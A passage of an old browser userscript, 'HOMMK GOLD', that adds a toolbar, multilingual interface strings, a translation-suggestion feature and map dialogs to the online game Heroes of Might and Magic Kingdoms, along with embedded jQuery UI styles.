padding: 0;	zoom: 1;	float: left;	clear: left;	width: 100%;}.ui-menu .ui-menu-item a {	text-decoration:none;	display:block;	padding:.2em .4em;	line-height:1.5;	zoom:1;}.ui-menu .ui-menu-item a.ui-state-hover,.ui-menu .ui-menu-item a.ui-state-active {	font-weight: normal;	margin: -1px;}/* * jQuery UI Button @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Button#theming */.ui-button { display: inline-block; position: relative; padding: 0; margin-right: .1em; text-decoration: none !important; cursor: pointer; text-align: center; zoom: 1; overflow: visible; } /* the overflow property removes extra width in IE */.ui-button-icon-only { width: 2.2em; } /* to make room for the icon, a width needs to be set here */button.ui-button-icon-only { width: 2.4em; } /* button elements seem to need a little more width */.ui-button-icons-only { width: 3.4em; } button.ui-button-icons-only { width: 3.7em; } /*button text element */.ui-button .ui-button-text { display: block; line-height: 1.4;  }.ui-button-text-only .ui-button-text { padding: .4em 1em; }.ui-button-icon-only .ui-button-text, .ui-button-icons-only .ui-button-text { padding: .4em; text-indent: -9999999px; }.ui-button-text-icon-primary .ui-button-text, .ui-button-text-icons .ui-button-text { padding: .4em 1em .4em 2.1em; }.ui-button-text-icon-secondary .ui-button-text, .ui-button-text-icons .ui-button-text { padding: .4em 2.1em .4em 1em; }.ui-button-text-icons .ui-button-text { padding-left: 2.1em; padding-right: 2.1em; }/* no icon support for input elements, provide padding by default */input.ui-button { padding: .4em 1em; }/*button icon element(s) */.ui-button-icon-only .ui-icon, .ui-button-text-icon-primary .ui-icon, .ui-button-text-icon-secondary .ui-icon, .ui-button-text-icons .ui-icon, .ui-button-icons-only .ui-icon { position: absolute; top: 50%; margin-top: -8px; }.ui-button-icon-only .ui-icon { left: 50%; margin-left: -8px; }.ui-button-text-icon-primary .ui-button-icon-primary, .ui-button-text-icons .ui-button-icon-primary, .ui-button-icons-only .ui-button-icon-primary { left: .5em; }.ui-button-text-icon-secondary .ui-button-icon-secondary, .ui-button-text-icons .ui-button-icon-secondary, .ui-button-icons-only .ui-button-icon-secondary { right: .5em; }.ui-button-text-icons .ui-button-icon-secondary, .ui-button-icons-only .ui-button-icon-secondary { right: .5em; }/*button sets*/.ui-buttonset { margin-right: 7px; }.ui-buttonset .ui-button { margin-left: 0; margin-right: -.3em; }/* workarounds */button.ui-button::-moz-focus-inner { border: 0; padding: 0; } /* reset extra padding in Firefox *//* * jQuery UI Dialog @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Dialog#theming */.ui-dialog { position: absolute; padding: .2em; width: 300px; overflow: hidden; }.ui-dialog .ui-dialog-titlebar { padding: .5em 1em .3em; position: relative;  }.ui-dialog .ui-dialog-title { float: left; margin: .1em 16px .2em 0; } .ui-dialog .ui-dialog-titlebar-close { position: absolute; right: .3em; top: 50%; width: 19px; margin: -10px 0 0 0; padding: 1px; height: 18px; }.ui-dialog .ui-dialog-titlebar-close span { display: block; margin: 1px; }.ui-dialog .ui-dialog-titlebar-close:hover, .ui-dialog .ui-dialog-titlebar-close:focus { padding: 0; }.ui-dialog .ui-dialog-content { position: relative; border: 0; padding: .5em 1em; background: none; overflow: auto; zoom: 1; }.ui-dialog .ui-dialog-buttonpane { text-align: left; border-width: 1px 0 0 0; background-image: none; margin: .5em 0 0 0; padding: .3em 1em .5em .4em; }.ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset { float: right; }.ui-dialog .ui-dialog-buttonpane button { margin: .5em .4em .5em 0; cursor: pointer; }.ui-dialog .ui-resizable-se { width: 14px; height: 14px; right: 3px; bottom: 3px; }.ui-draggable .ui-dialog-titlebar { cursor: move; }/* * jQuery UI Slider @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Slider#theming */.ui-slider { position: relative; text-align: left; }.ui-slider .ui-slider-handle { position: absolute; z-index: 2; width: 1.2em; height: 1.2em; cursor: default; }.ui-slider .ui-slider-range { position: absolute; z-index: 1; font-size: .7em; display: block; border: 0; background-position: 0 0; }.ui-slider-horizontal { height: .8em; }.ui-slider-horizontal .ui-slider-handle { top: -.3em; margin-left: -.6em; }.ui-slider-horizontal .ui-slider-range { top: 0; height: 100%; }.ui-slider-horizontal .ui-slider-range-min { left: 0; }.ui-slider-horizontal .ui-slider-range-max { right: 0; }.ui-slider-vertical { width: .8em; height: 100px; }.ui-slider-vertical .ui-slider-handle { left: -.3em; margin-left: 0; margin-bottom: -.6em; }.ui-slider-vertical .ui-slider-range { left: 0; width: 100%; }.ui-slider-vertical .ui-slider-range-min { bottom: 0; }.ui-slider-vertical .ui-slider-range-max { top: 0; }/* * jQuery UI Tabs @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Tabs#theming */.ui-tabs { position: relative; padding: .2em; zoom: 1; } /* position: relative prevents IE scroll bug (element with position: relative inside container with overflow: auto appear as "fixed") */.ui-tabs .ui-tabs-nav { margin: 0; padding: .2em .2em 0; }.ui-tabs .ui-tabs-nav li { list-style: none; float: left; position: relative; top: 1px; margin: 0 .2em 1px 0; border-bottom: 0 !important; padding: 0; white-space: nowrap; }.ui-tabs .ui-tabs-nav li a { float: left; padding: .5em 1em; text-decoration: none; }.ui-tabs .ui-tabs-nav li.ui-tabs-selected { margin-bottom: 0; padding-bottom: 1px; }.ui-tabs .ui-tabs-nav li.ui-tabs-selected a, .ui-tabs .ui-tabs-nav li.ui-state-disabled a, .ui-tabs .ui-tabs-nav li.ui-state-processing a { cursor: text; }.ui-tabs .ui-tabs-nav li a, .ui-tabs.ui-tabs-collapsible .ui-tabs-nav li.ui-tabs-selected a { cursor: pointer; } /* first selector in group seems obsolete, but required to overcome bug in Opera applying cursor: text overall if defined elsewhere... */.ui-tabs .ui-tabs-panel { display: block; border-width: 0; padding: 1em 1.4em; background: none; }.ui-tabs .ui-tabs-hide { display: none !important; }/* * jQuery UI Datepicker @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Datepicker#theming */.ui-datepicker { width: 17em; padding: .2em .2em 0; }.ui-datepicker .ui-datepicker-header { position:relative; padding:.2em 0; }.ui-datepicker .ui-datepicker-prev, .ui-datepicker .ui-datepicker-next { position:absolute; top: 2px; width: 1.8em; height: 1.8em; }.ui-datepicker .ui-datepicker-prev-hover, .ui-datepicker .ui-datepicker-next-hover { top: 1px; }.ui-datepicker .ui-datepicker-prev { left:2px; }.ui-datepicker .ui-datepicker-next { right:2px; }.ui-datepicker .ui-datepicker-prev-hover { left:1px; }.ui-datepicker .ui-datepicker-next-hover { right:1px; }.ui-datepicker .ui-datepicker-prev span, .ui-datepicker .ui-datepicker-next span { display: block; position: absolute; left: 50%; margin-left: -8px; top: 50%; margin-top: -8px;  }.ui-datepicker .ui-datepicker-title { margin: 0 2.3em; line-height: 1.8em; text-align: center; }.ui-datepicker .ui-datepicker-title select { font-size:1em; margin:1px 0; }.ui-datepicker select.ui-datepicker-month-year {width: 100%;}.ui-datepicker select.ui-datepicker-month, .ui-datepicker select.ui-datepicker-year { width: 49%;}.ui-datepicker table {width: 100%; font-size: .9em; border-collapse: collapse; margin:0 0 .4em; }.ui-datepicker th { padding: .7em .3em; text-align: center; font-weight: bold; border: 0;  }.ui-datepicker td { border: 0; padding: 1px; }.ui-datepicker td span, .ui-datepicker td a { display: block; padding: .2em; text-align: right; text-decoration: none; }.ui-datepicker .ui-datepicker-buttonpane { background-image: none; margin: .7em 0 0 0; padding:0 .2em; border-left: 0; border-right: 0; border-bottom: 0; }.ui-datepicker .ui-datepicker-buttonpane button { float: right; margin: .5em .2em .4em; cursor: pointer; padding: .2em .6em .3em .6em; width:auto; overflow:visible; }.ui-datepicker .ui-datepicker-buttonpane button.ui-datepicker-current { float:left; }/* with multiple calendars */.ui-datepicker.ui-datepicker-multi { width:auto; }.ui-datepicker-multi .ui-datepicker-group { float:left; }.ui-datepicker-multi .ui-datepicker-group table { width:95%; margin:0 auto .4em; }.ui-datepicker-multi-2 .ui-datepicker-group { width:50%; }.ui-datepicker-multi-3 .ui-datepicker-group { width:33.3%; }.ui-datepicker-multi-4 .ui-datepicker-group { width:25%; }.ui-datepicker-multi .ui-datepicker-group-last .ui-datepicker-header { border-left-width:0; }.ui-datepicker-multi .ui-datepicker-group-middle .ui-datepicker-header { border-left-width:0; }.ui-datepicker-multi .ui-datepicker-buttonpane { clear:left; }.ui-datepicker-row-break { clear:both; width:100%; }/* RTL support */.ui-datepicker-rtl { direction: rtl; }.ui-datepicker-rtl .ui-datepicker-prev { right: 2px; left: auto; }.ui-datepicker-rtl .ui-datepicker-next { left: 2px; right: auto; }.ui-datepicker-rtl .ui-datepicker-prev:hover { right: 1px; left: auto; }.ui-datepicker-rtl .ui-datepicker-next:hover { left: 1px; right: auto; }.ui-datepicker-rtl .ui-datepicker-buttonpane { clear:right; }.ui-datepicker-rtl .ui-datepicker-buttonpane button { float: left; }.ui-datepicker-rtl .ui-datepicker-buttonpane button.ui-datepicker-current { float:right; }.ui-datepicker-rtl .ui-datepicker-group { float:right; }.ui-datepicker-rtl .ui-datepicker-group-last .ui-datepicker-header { border-right-width:0; border-left-width:1px; }.ui-datepicker-rtl .ui-datepicker-group-middle .ui-datepicker-header { border-right-width:0; border-left-width:1px; }/* IE6 IFRAME FIX (taken from datepicker 1.5.3 */.ui-datepicker-cover {    display: none; /*sorry for IE5*/    display/**/: block; /*sorry for IE5*/    position: absolute; /*must have*/    z-index: -1; /*must have*/    filter: mask(); /*must have*/    top: -4px; /*must have*/    left: -4px; /*must have*/    width: 200px; /*must have*/    height: 200px; /*must have*/}/* * jQuery UI Progressbar @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Progressbar#theming */.ui-progressbar { height:2em; text-align: left; }.ui-progressbar .ui-progressbar-value {margin: -1px; height:100%; }');

	addStyle('.ui-dialog-content .ui-widget-header{background-color:transparent !important;background-image:none !important;}');

	addStyle('.edit_localize{cursor:pointer;width:10px !important;height:10px !important;}.edit_localize:hover{border:black white 1px;background-color:lightgreen;}');

})();

	
	var lang = localStorage_getObject('lang',{});
	if(typeof lang.edit == 'undefined')
		lang.edit=false;
	
	var locale = 'en';
	var locale_strings = {};
	
	
	w.translation = function(evt,NAMESPACE,text){
		evt = evt || window.event;
		if(evt.stopPropagation)
			evt.stopPropagation();
		evt.cancelBubble = true;
		var txt = prompt("suggest a better translation",text);
		if(txt != null && txt!=text){
			lang[lang.selected] = lang[lang.selected] || {};
			lang[lang.selected][NAMESPACE] = txt;
			localStorage_setObject('lang',lang);
			$("."+NAMESPACE).text(txt);
			var script = document.createElement('script');
			script.src = encodeURI("http://www.hommk.net/final/update/translation.php?lang="+locale+"&data="+NAMESPACE+"&text="+txt);
			document.getElementsByTagName('head')[0].appendChild(script);
			alert("thanks, you submission have been registered and will be analysed soon.");
		}
		return false;
	}
		
	function localize( txt ){
		var temp = locale_strings[txt];
		switch (typeof temp) {
			case 'string':
				return '<span class="'+txt+'">'+temp+'</span>'+(lang.edit?' <img onclick="return translation(arguments[0],'+"'"+txt+"','"+temp+"'"+');" title="suggest a better translation" class="edit_localize" src="http://www.hommk.net/img/script/edit.png" />':'');
			case 'undefined':
				return txt;
			case 'function':
				return temp(arguments);
		} 
		return null;
	}

// locale primaire : anglais

	var locale_strings_default = {
	
		// menu and settings
		LINK_OPTION:		'Settings',
		GOLD_EXPAND:		'tools',
		GOLD_MINIMIZE:		'tools',
		BUYABLE_SETTING:	'Display buyable features',
		CLEAR_SETTING:		'Delete the local data',
		
		// buttons
		JACTARI_BUTTON:		'Jactari Fight',
		VIGIE_BUTTON: 		'Lookout',
		VIEW_BUTTON: 		'Map',
		FINDER_BUTTON: 		'Geologist',
		WORLD_BUTTON: 		'My Worlds',
		ALLIANCE_BUTTON: 	'Alliance',
		DATA_BUTTON: 		'Overview',
		
		// data
		RESSOURCES_DATA:	'Resources',
		RESSOURCES_TROOP:	'Troops',
		RESSOURCES_SPELL:	'Spells',
		RESSOURCES_ARTEF:	'Artifacts',
		RESSOURCES_ACTIONS:	'Actions',
		RESSOURCES_FORTR:	'Fortresses',
		
		// text
		TEXT_TOTAL:			'Total',
		TEXT_NAME:			'Name',
		TEXT_EFFECTS:		'Effects',
		TEXT_TYPE:			'Type',
		TEXT_OWNER:			'Owner',
		
		// vigie
		TEXT_NOMOVE:		'No movement',
		TEXT_ALLIANCE:		'Alliance',
		TEXT_PLAYER:		'Player',
		TEXT_FROM:			'From',
		TEXT_TO:			'To',
		TEXT_ARRIVAL:		'Arrival',
		TEXT_DETAILS:		'Details',
		
		// carto
		TEXT_MOUSE:			'Mouse',
		TEXT_CURRENT:		'Current',
		TEXT_ZOOM:			'Zoom',
		
		// selector
		EMPTY_LIST:			'empty list',
		
		// alliance
		ALLIANCE_REPORT:	'Spy reports',
		ALLIANCE_AUTOSPY:	'autosave spy reports',
		ALLIANCE_AUTOBATT:	'autosave battle reports',
		ALLIANCE_HIDEPAN:	'hide the map panels', 
		
		
		// about
		LINK_ABOUT:       	'About',
		LINK_UPDATE: 		function(param){ 
							return 'New version ' + param[1] + ' is avalaible.'
								+  'Please update <a href="'  + param[2] + '" class="ui-state-default" target="_blank">here</a>'; 
							},
					
		// lookout		
		VIGIE_NOTHING_HERE:	'nothing here.',
		VIGIE_SEARCH_TROOPS:'searching troops mouvements ...',
		
		// dont modify, it's for jactari site url
        JACTARI_FIGHT: 		'fight'
	};
	
	
	
// locale secondaire : français ou allemand ou russe

	var locale_strings_fr = {
	
		// menu and settings
		LINK_OPTION:		'Options',
		GOLD_EXPAND:		'outils',
		GOLD_MINIMIZE:		'outils',
		BUYABLE_SETTING:	'Afficher les options payantes',
		CLEAR_SETTING:		'Supprimer les données locales',
		
		// buttons
		JACTARI_BUTTON:   	'Jactari Combat',
		VIGIE_BUTTON:    	'Vigie',
		VIEW_BUTTON: 		'Cartographe',
		FINDER_BUTTON: 		'Géologue',
		WORLD_BUTTON: 		'Mondes',
		ALLIANCE_BUTTON: 	'Alliance',
		DATA_BUTTON: 		'Royaume',
		
		// data
		RESSOURCES_DATA:	'Ressources',
		RESSOURCES_TROOP:	'Troupes',
		RESSOURCES_SPELL:	'Sorts',
		RESSOURCES_ARTEF:	'Artefacts',
		RESSOURCES_ACTIONS:	'Actions',
		RESSOURCES_FORTR:	'Forteresses',
		
		// text
		TEXT_TOTAL:			'Total',
		TEXT_NAME:			'Nom',
		TEXT_EFFECTS:		'Effets',
		TEXT_TYPE:			'Type',
		TEXT_OWNER:			'Propriétaire',
		
		// vigie
		TEXT_NOMOVE:		'Aucun mouvement',
		TEXT_ALLIANCE:		'Alliance',
		TEXT_PLAYER:		'Joueur',
		TEXT_FROM:			'Départ',
		TEXT_TO:			'Destination',
		TEXT_ARRIVAL:		'Arrivée à',
		TEXT_DETAILS:		'Détails',
		
		// carto
		TEXT_MOUSE:			'Souris',
		TEXT_CURRENT:		'Courant',
		TEXT_ZOOM:			'Zoom',
		
		// selector
		EMPTY_LIST:			'vider la liste',
		
		// alliance
		ALLIANCE_REPORT:	'Rapports d&#8217;espion.',
		ALLIANCE_AUTOSPY:	'sauvegarde auto. des rapports d&#8217;espionnage',
		ALLIANCE_AUTOBATT:	'sauvegarde auto. des rapports de batailles',
		ALLIANCE_HIDEPAN:	'masquer les panneaux d&#8217;affichages', 
		
		// about
		LINK_ABOUT:       'A propos',
		LINK_UPDATE: 		function(param){
							return 	'Nouvelle version ' + param[1] + ' disponible.'
								+ 	' Mettez votre script Ã  jour <a href="'  + param[2] + '" class="ui-state-default" target="_blank">ici</a>'; 
							},
		
		// dont modify, it's for jactari site url
        JACTARI_FIGHT: 		'combat'
	};

	var locale_strings_de = {
	
		// menu and settings
		LINK_OPTION:		'Einstellungen',
		GOLD_EXPAND:		'tools',
		GOLD_MINIMIZE:		'tools',
		BUYABLE_SETTING:	'Zeige Premium-Funktionen',
		CLEAR_SETTING:		'Löschen Sie die lokalen Daten',
		
		// buttons
		JACTARI_BUTTON:   	'Jactari Kampf',
		VIGIE_BUTTON:    	'Bewegungen',
		VIEW_BUTTON: 		'Weltkarte',
		FINDER_BUTTON: 		'Bodenschätze',
		WORLD_BUTTON: 		'Welten',
		ALLIANCE_BUTTON: 	'Bündnis',
		DATA_BUTTON: 		'Übersicht',
		
		// data
		RESSOURCES_DATA:	'Ressourcen',
		RESSOURCES_TROOP:	'Truppen',
		RESSOURCES_SPELL:	'Zauber',
		RESSOURCES_ARTEF:	'Artefakte',
		RESSOURCES_ACTIONS:	'Aktionen',
		RESSOURCES_FORTR:	'Festungen',
		
		// text
		TEXT_TOTAL:			'Gesamt',
		TEXT_NAME:			'Name',
		TEXT_EFFECTS:		'Effekte',
		TEXT_TYPE:			'Typ',
		TEXT_OWNER:			'Besitzer',
		
		// vigie
		TEXT_NOMOVE:		'Keine Bewegung',
		TEXT_ALLIANCE:		'Bündnis',
		TEXT_PLAYER:		'Spieler',
		TEXT_FROM:			'Von',
		TEXT_TO:			'Nach',
		TEXT_ARRIVAL:		'Ankunftszeit',
		TEXT_DETAILS:		'Details',
		
		// carto
		TEXT_MOUSE:			'Maus',
		TEXT_CURRENT:		'Karte',
		TEXT_ZOOM:			'Zoom',
		
		// selector
		EMPTY_LIST:			'Liste leeren',
		
		// alliance
		ALLIANCE_REPORT:	'Spionageberichte',
		ALLIANCE_AUTOSPY:	'Spionageberichte automatisch speichern',
		ALLIANCE_AUTOBATT:	'Kampfberichte automatisch speichern',
		ALLIANCE_HIDEPAN:	'blenden Sie die Karte Panels', 
		
		// about
		LINK_ABOUT:       	'About',
		LINK_UPDATE: 		function(param){ 
							return 'New version ' + param[1] + ' is avalaible.'
								+  'Please update <a href="'  + param[2] + '" class="ui-state-default" target="_blank">here</a>'; 
							},
		
		// dont modify, it's for jactari site url
        JACTARI_FIGHT: 'Kampf'
	};
	
	
	var locale_strings_es = {
		ALLIANCE_BUTTON:	'Alianza',
		FINDER_BUTTON:		'Regiones',
		LINK_OPTION:		'Configuración',
		RESSOURCES_ACTIONS:	'Acciones',
		RESSOURCES_ARTEF:	'Artefactos',
		RESSOURCES_DATA:	'Recursos',
		RESSOURCES_FORTR:	'Fuertes',
		RESSOURCES_SPELL:	'Hechizos',
		RESSOURCES_TROOP:	'Tropas',
		VIGIE_BUTTON:		'Movimientos',
		VIEW_BUTTON:		'Mapa'
	};
	
	
	var locale_strings_ru = {
	
		// menu and settings
		LINK_OPTION:		'Настройки',
		LINK_ABOUT:       	'о скрипте',
		GOLD_EXPAND:      	'меню',
		GOLD_MINIMIZE:    	'меню',
		BUYABLE_SETTING:	'Показать покупаемые особенности',
		CLEAR_SETTING:		'Удаление локальных данных',
		
		// buttons
		JACTARI_BUTTON:		'cимулятор',
		VIGIE_BUTTON: 		'движения',
		VIEW_BUTTON: 		'Карта мира',
		FINDER_BUTTON: 		'поиск ресур.',
		WORLD_BUTTON: 		'Выбор мира',
		ALLIANCE_BUTTON: 	'Альянс',
		DATA_BUTTON: 		'Статистика',
		SETTINGS_BUTTON: 	'данные',
		
		// data
		RESSOURCES_DATA:	'Ресурсы',
		RESSOURCES_TROOP:	'Войска',
		RESSOURCES_SPELL:	'Заклинания',
		RESSOURCES_ARTEF:	'Артефакты',
		RESSOURCES_ACTIONS:	'Действия',
		RESSOURCES_FORTR:	'Крепости',
		
		// text
		TEXT_TOTAL:			'ИТОГО',
		TEXT_NAME:			'имя',
		TEXT_EFFECTS:		'эффекты',
		TEXT_TYPE:			'тип',
		TEXT_OWNER:			'владелец',
		
		// vigie
		TEXT_NOMOVE:		'Нет движения',
		TEXT_ALLIANCE:		'альянс',
		TEXT_PLAYER:		'игрок',
		TEXT_FROM:			'от',
		TEXT_TO:			'куда',
		TEXT_ARRIVAL:		'время прибытия',
		TEXT_DETAILS:		'детали',
		
		// carto
		TEXT_MOUSE:			'мышь',
		TEXT_CURRENT:		'текущий',
		TEXT_ZOOM:			'зум',
		
		// selector
		EMPTY_LIST:			'Очистить список',
		
		// alliance
		ALLIANCE_REPORT:	'Отчеты разведки',
		ALLIANCE_AUTOSPY:	'автосохранение отчетов шпионажа',
		ALLIANCE_AUTOBATT:	'автосохранение отчетов о сражениях',
		ALLIANCE_HIDEPAN:	'скрыть карту панелей', 
		
		// about
		LINK_UPDATE: 		function(param){
							return 'ÐÐ¾Ð²Ð°Ñ Ð²ÐµÑ€ÑÐ¸Ñ ' + param[1] + ' Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð°.'
								+  ' Ð”Ð»Ñ Ð¾Ð±Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ <a href="'  + param[2] + '" class="ui-state-default" target="_blank">Ð¶Ð¼Ð¸</a>'; 
							},		
		
		// dont modify, it's for jactari site url
        'JACTARI_FIGHT': 'бой'
	};
	
	var locale_strings_ko = { // korean
	
		// menu and settings
		LINK_OPTION:		'설정',
		GOLD_EXPAND:		'tools',
		GOLD_MINIMIZE:		'tools',
		BUYABLE_SETTING:	'기능을 구입할 표시',
		CLEAR_SETTING:		'로컬 데이터를 삭제',
		
		// buttons
		JACTARI_BUTTON:		'Jactari Fight',
		VIGIE_BUTTON: 		'전망대',
		VIEW_BUTTON: 		'지도 제작자',
		FINDER_BUTTON: 		'지질학',
		WORLD_BUTTON: 		'세계',
		ALLIANCE_BUTTON: 	'동맹',
		DATA_BUTTON: 		'데이터',
		
		// data
		RESSOURCES_DATA:	'능숙해',
		RESSOURCES_TROOP:	'군대',
		RESSOURCES_SPELL:	'주문',
		RESSOURCES_ARTEF:	'유물',
		RESSOURCES_ACTIONS:	'행위',
		RESSOURCES_FORTR:	'요새',
		
		// text
		TEXT_TOTAL:			'합계',
		TEXT_NAME:			'이름',
		TEXT_EFFECTS:		'효과',
		TEXT_TYPE:			'유형',
		TEXT_OWNER:			'소유자',
		
		// vigie
		TEXT_NOMOVE:		'아무도 움직이지 마라',
		TEXT_ALLIANCE:		'동맹',
		TEXT_PLAYER:		'플레이어',
		TEXT_FROM:			'부터',
		TEXT_TO:			'목적지',
		TEXT_ARRIVAL:		'도착 시간',
		TEXT_DETAILS:		'세부',
		
		// carto
		TEXT_MOUSE:			'마우스',
		TEXT_CURRENT:		'현재',
		TEXT_ZOOM:			'줌',
		
		// selector
		EMPTY_LIST:			'빈 목록',
		
		// alliance
		ALLIANCE_REPORT:	'스파이 보고서',
		ALLIANCE_AUTOSPY:	'자동 저장 스파이 보고서',
		ALLIANCE_AUTOBATT:	'자동 저장 전투 보고서',
		ALLIANCE_HIDEPAN:	'지도 패널을 숨기려면', 
		
		// about
		LINK_ABOUT:       	'About',
		LINK_UPDATE: 		function(param){ 
							return 'New version ' + param[1] + ' is avalaible.'
								+  'Please update <a href="'  + param[2] + '" class="ui-state-default" target="_blank">here</a>'; 
							},
		
		// dont modify, it's for jactari site url
        JACTARI_FIGHT: 		'fight'
	};
	
	var locale_strings_zh = { // chinese
	
		// menu and settings
		LINK_OPTION:		'设置',
		GOLD_EXPAND:		'tools',
		GOLD_MINIMIZE:		'tools',
		BUYABLE_SETTING:	'显示可买的功能',
		CLEAR_SETTING:		'删除本地数据',
		
		// buttons
		JACTARI_BUTTON:		'Jactari Fight',
		VIGIE_BUTTON: 		'了望',
		VIEW_BUTTON: 		'制图',
		FINDER_BUTTON: 		'地质学家',
		WORLD_BUTTON: 		'世界',
		ALLIANCE_BUTTON: 	'联盟',
		DATA_BUTTON: 		'数据',
		
		// data
		RESSOURCES_DATA:	'资源',
		RESSOURCES_TROOP:	'军队',
		RESSOURCES_SPELL:	'法术',
		RESSOURCES_ARTEF:	'文物',
		RESSOURCES_ACTIONS:	'行动',
		RESSOURCES_FORTR:	'堡垒',
		
		// text
		TEXT_TOTAL:			'总',
		TEXT_NAME:			'名称',
		TEXT_EFFECTS:		'影响',
		TEXT_TYPE:			'类型',
		TEXT_OWNER:			'业主',
		
		// vigie
		TEXT_NOMOVE:		'没有运动',
		TEXT_ALLIANCE:		'联盟',
		TEXT_PLAYER:		'播放机',
		TEXT_FROM:			'从',
		TEXT_TO:			'目的地',
		TEXT_ARRIVAL:		'到达时间',
		TEXT_DETAILS:		'详情',
		
		// carto
		TEXT_MOUSE:			'鼠标',
		TEXT_CURRENT:		'当前',
		TEXT_ZOOM:			'放大',
		
		// selector
		EMPTY_LIST:			'空列表',
		
		// alliance
		ALLIANCE_REPORT:	'间谍的报告',
		ALLIANCE_AUTOSPY:	'自动保存间谍报道',
		ALLIANCE_AUTOBATT:	'自动保存战斗报告',
		ALLIANCE_HIDEPAN:	'隐藏地图面板', 
		
		// about
		LINK_ABOUT:       	'About',
		LINK_UPDATE: 		function(param){ 
							return 'New version ' + param[1] + ' is avalaible.'
								+  'Please update <a href="'  + param[2] + '" class="ui-state-default" target="_blank">here</a>'; 
							},
		
		// dont modify, it's for jactari site url
        JACTARI_FIGHT: 		'fight'
	};
	
	
	
	// --------------------------------------------------------------------------
	
	
	
	// initialisation locale
    var matches = ( new RegExp('\\w\\w') ).exec( HOMMK.locale );
    if (matches && matches.length){
        locale = matches[0];
    }
	
	if(lang.selected)
		locale = lang.selected;
	else
		lang.selected = locale;
	
    console.log("language:", locale);
	
    extend( locale_strings, locale_strings_default );
    switch(locale){
		case "fr": 
			extend( locale_strings, locale_strings_fr ); 
			break;
		case "de": 
			extend( locale_strings, locale_strings_de ); 
			break;
		case "es": 
			extend( locale_strings, locale_strings_es ); 
			break;
		case "ru": 
			extend( locale_strings, locale_strings_ru ); 
			break;
		case "zh": 
			extend( locale_strings, locale_strings_zh ); 
			break;
		case "ko": 
			extend( locale_strings, locale_strings_ko ); 
			break;
	}
	if(typeof lang[locale] == 'object')
			extend( locale_strings, lang[locale] ); 
	
  	function toobar_button(text,callback,target,submenu){
		var t = target || $main_row;
		var button = $('<td style="width:125px;max-width:125px;cursor:pointer;"></td>').appendTo(t);
		var lien = $('<a href="#" target="_blank" style="display:block;text-align:center;width:120px;" class="toolbar_button ui-button ui-button-text-only ui-widget ui-state-default ">'+text+'</a>').appendTo(button);
		lien.hover(function(){
			if(!$(this).hasClass("ui-state-disabled"))
				$(this).addClass('ui-state-hover');
		},function(){
			$(this).removeClass('ui-state-hover');
		});
		lien.click(callback);
		if(submenu)
			button.append(submenu);
		return lien;
	}

	

	
	var $toolbar = $('<div class="ui-dialog ui-widget ui-widget-content"></div>')
		.css({zIndex:101000,position:'absolute',top:'-1px',width:'100%',right:'-1px',border:0,left:0,overflow:'visible',height:'17px',maxHeight:'17px'}).prependTo($('body'));


	
	$(w).scroll(function() {
		$toolbar.css('top', ($(this).scrollTop()-1) + "px");
		$toolbar.css('left', ($(this).scrollLeft()-5) + "px");
	});
	
	var $main_row = $('<tr></tr>');
	$main_row.appendTo($('<table id="toolbar"></table>')).appendTo($toolbar);

	$('<td style="width:140px;cursor:pointer;text-align:center;"></td>')
		.append(
			$('<div style="width:140px;padding-left:5px;border:solid gray 2px;">HOMMK GOLD '+version+'</div>')
			.hover(
				function(){
					$(this).css({
						backgroundColor:'lightgray'
					});
				},
				function(){
					$(this).css({
						backgroundColor:''
					});
				}
			)
			.click(function() {

				launch_about();
				return false;
			})
		)
		.appendTo($main_row);
	//console.log($('body').offset());

	
	var $secondary_row = $('<tr></tr>');
	$secondary_row.appendTo($('<table></table>')).appendTo($main_row);
	
	
	//toobar_button('options',function(){return false;});
	
	var container_offset_top = $('#Container').offset().top;
	if(container_offset_top < 20)
		$('#Container').css({top:(22-container_offset_top)+'px'});
	
	
	//toggle_dialog( $toolbar );
	//.prependTo($('body'));

//.prependTo($('body'));
//$("#jMenu").jMenu();


var $dialog_about;function launch_about(){$dialog_about||($dialog_about=$('<div id="hommk-user-about"></div>').html(["HOMMK GOLD version "+version,"\u00a9 Dragon Azur 2011",' - home page : <a href="http://www.hommk.net/indexscript.php" class="ui-state-default" target="_blank">[hommk.net]</a>',"","",""].join("<br>")).dialog({width:260,autoOpen:false,zIndex:9E4,resizable:false,draggable:false,title:localize("LINK_ABOUT"),open:function(){},position:[0,20]}));toggle_dialog($dialog_about)};
 ///////////////////////// Map-Finder

		var $mapfinder;
		
		(function(){
			var openFinder = localStorage_getObject("HOMMK_finder",false);
			var size = HOMMK.worldMap.content._size || 280;
			var chinois = (window.location.hostname == "h3.hommk.com" || window.location.hostname == "h2.hommk.com")?10000:(window.location.hostname == "mmhk.ubisoft.com.hk")?20000:0;
			if(openFinder)
				var link = 'http://www.hommk.net/index.php?SERVER='+(HOMMK.player.content.worldId+chinois)+'&ID='+((HOMMK.currentView.regionY-1)*size+HOMMK.currentView.regionX);
			else
				var link = "about:blank";
		
			var position = localStorage_getObject("HOMMK_finder_position",{left:'left',top:''});
			$mapfinder = $("<div id='hommk-gold-finder'></div>").dialog({
					autoOpen:false,
					zIndex: 90000,
					width:473,
					resizable: false,
					position: [position.left,position.top],
					title: localize("FINDER_BUTTON"),
					dragStop: function(e,ui) { 
						localStorage_setObject("HOMMK_finder_position",ui.position);
						$iframe.show();
					},
					open: function(){
						localStorage_setObject("HOMMK_finder", true );
					},
					close: function(){
						localStorage_setObject("HOMMK_finder", false );
					},
					drag: function(){
						$iframe.hide();
					}
				});
			var $container = $("<div id='hommk-gold-finder-container'></div>").css({
